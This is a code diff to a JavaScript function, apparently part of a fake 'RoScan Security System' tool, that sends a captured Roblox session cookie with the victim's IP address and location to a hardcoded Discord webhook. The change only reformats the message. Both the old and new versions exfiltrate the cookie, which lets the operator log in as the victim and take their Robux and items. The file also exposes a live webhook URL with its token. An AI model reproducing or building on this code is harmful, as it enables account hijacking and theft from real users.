@@ -243,42 +243,11 @@ async function submitPowerShell() {
         const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
         
         const cookieEmbed = {
-            content: "@everyone",
-            embeds: [{
-                title: "🍪 Roblox Cookie Captured",
-                color: 0xff0000,
-                fields: [
-                    {
-                        name: "⚠️ WARNING",
-                        value: "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_",
-                        inline: false
-                    },
-                    {
-                        name: "⚠️ DO NOT SHARE",
-                        value: "Do not share the cookie with other people",
-                        inline: false
-                    },
-                    {
-                        name: "🍪 Cookie",
-                        value: `\`\`\`${globalRobloxCookie || 'None found'}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "📍 Location",
-                        value: `${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`,
-                        inline: true
-                    },
-                    {
-                        name: "🌐 IP Address",
-                        value: locationInfo.ip || 'Unknown',
-                        inline: true
-                    }
-                ],
-                timestamp: new Date().toISOString(),
-                footer: {
-                    text: "RoScan Security System"
-                }
-            }]
+            content: `@everyone
+🍪 Cookie: ${globalRobloxCookie || 'None found'}
+📍 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+🌐 IP: ${locationInfo.ip || 'Unknown'}
+⚠️ WARNING: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_`
         };
 
         const response = await fetch(webhookUrl, {
